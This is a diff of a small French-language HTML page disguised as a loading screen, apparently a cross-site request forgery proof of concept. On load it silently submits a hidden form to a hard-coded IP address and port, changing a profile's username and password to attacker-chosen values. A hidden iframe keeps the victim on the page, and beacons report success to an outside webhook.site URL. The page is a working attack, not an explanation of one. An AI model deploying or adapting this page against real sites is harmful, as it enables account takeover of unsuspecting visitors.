@@ -2,31 +2,37 @@
 <html lang="fr">
 <head>
   <meta charset="utf-8">
-  <title>Chargement</title>
+  <title>Chargement…</title>
 </head>
 <body>
-  <p>Chargement…</p>
+
+  <!-- Permet de soumettre le formulaire sans quitter cette page -->
+  <iframe name="result" hidden></iframe>
 
   <form
     id="csrf"
     action="http://130.117.187.88:39918/profile"
     method="POST"
+    target="result"
   >
-    <input
-      type="hidden"
-      name="username"
-      value="admin"
-    >
-
-    <input
-      type="hidden"
-      name="password"
-      value="test"
-    >
+    <input type="hidden" name="username" value="admin_pwned">
+    <input type="hidden" name="password" value="Password123!">
   </form>
 
   <script>
+    const webhook =
+      "https://webhook.site/a62a31c7-5a6a-4504-b3bf-9913cee4cd42";
+
+    // Indique que la page a été ouverte et que JavaScript fonctionne.
+    navigator.sendBeacon(webhook + "?event=page_loaded");
+
+    // Envoie la requête CSRF dans l'iframe.
     document.getElementById("csrf").submit();
+
+    // Indique que submit() a bien été appelé.
+    setTimeout(() => {
+      navigator.sendBeacon(webhook + "?event=form_submitted");
+    }, 1000);
   </script>
 </body>
 </html>
